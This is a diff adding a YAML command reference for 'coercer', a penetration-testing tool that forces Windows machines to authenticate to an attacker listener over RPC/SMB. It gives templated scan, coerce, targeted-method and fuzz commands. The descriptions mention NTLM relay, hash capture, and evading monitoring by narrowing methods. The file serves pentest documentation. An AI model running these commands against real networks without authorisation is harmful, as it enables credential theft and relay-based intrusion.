@@ -1,0 +1,48 @@
+tool: coercer
+tags: [windows, authentication, coercion, pentest, security, active-directory, smb, rpc]
+
+actions:
+# === SCANNING AND RECONNAISSANCE ===
+  - title: coercer - basic scan
+    desc: |
+      Performs a non-intrusive scan to identify which coercion methods are successful against a target. 
+      This is used during initial reconnaissance to map out vulnerabilities in Windows RPC and SMB services without forcing a full authentication. 
+      The tool reports back when an authentication request is successfully received on the listener side.
+    command: "coercer scan -t {{target_ip}} -u {{username}} -p {{password}} -d {{domain}} -l {{listener_ip}}"
+
+  - title: coercer - verbose scanning
+    desc: |
+      Executes a scan with the verbose flag enabled to provide detailed feedback on each attempt. 
+      Use this when you need to troubleshoot failed connections or understand which specific RPC calls are being blocked. 
+      It provides a granular view of the interaction between the attacker machine and the target's remote procedures.
+    command: "coercer -v scan -t {{target_ip}} -u {{username}} -p {{password}} -d {{domain}} -l {{listener_ip}}"
+
+# === AUTHENTICATION COERCION ===
+  - title: coercer - trigger authentication
+    desc: |
+      Triggers authentications through all known methods using established working paths. 
+      This command is the primary way to force a target machine to authenticate to a listener for NTLM relay attacks or hash capturing. 
+      Ensure that a listener like Responder or ntlmrelayx is active on the listener IP before running this.
+    command: "coercer coerce -t {{target_ip}} -u {{username}} -p {{password}} -d {{domain}} -l {{listener_ip}}"
+
+  - title: coercer - targeted method coercion
+    desc: |
+      Runs the coercion process but limits the attempts to a specific method or protocol. 
+      This is useful when you know a specific protocol like MS-RPRN or MS-EFSR is vulnerable and want to minimize network noise. 
+      Targeting specific methods can help bypass certain security monitoring systems that look for broad scanning patterns.
+    command: "coercer coerce --methods {{method|MS-RPRN}} -t {{target_ip}} -u {{username}} -p {{password}} -d {{domain}} -l {{listener_ip}}"
+
+# === ADVANCED FUZZING ===
+  - title: coercer - path fuzzing
+    desc: |
+      Tests every available coercion method against a comprehensive list of potential exploit paths. 
+      This mode is used when standard paths are patched or blocked to find alternative ways to trigger authentication. 
+      It is more resource-intensive and generates significant logs on the target, so use it with caution in sensitive environments.
+    command: "coercer fuzz -t {{target_ip}} -u {{username}} -p {{password}} -d {{domain}} -l {{listener_ip}}"
+
+  - title: coercer - fuzz with specific export
+    desc: |
+      Runs a fuzzing operation and saves the results to a specific file format for later analysis. 
+      This helps in documenting vulnerabilities found during a penetration test for reporting purposes. 
+      It ensures that all successful authentication triggers are recorded with their corresponding paths and methods.
+    command: "coercer fuzz -t {{target_ip}} -u {{username}} -p {{password}} -d {{domain}} -l {{listener_ip}} --export-json {{filename|results.json}}"
